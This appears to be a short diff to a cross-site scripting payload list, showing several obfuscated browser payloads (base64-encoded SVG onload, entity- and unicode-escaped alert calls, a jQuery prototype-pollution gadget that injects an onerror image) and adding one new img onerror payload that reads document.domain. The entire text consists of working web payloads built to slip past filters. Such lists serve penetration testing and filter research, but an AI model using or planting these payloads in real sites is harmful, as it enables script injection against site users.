@@ -27,3 +27,4 @@ eCI+PHN2RyBvbkxvYWQ9cHJvbXB0KHdpbmRvdy5vcmlnaW4pPg==
 <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
 <script>\u0061lert(1)</script><script>
 Object.prototype.preventDefault='x';Object.prototype.handleObj='x';Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';$(document).off('foobar');</script>
+<img src onerror=alt=''+document.domain>
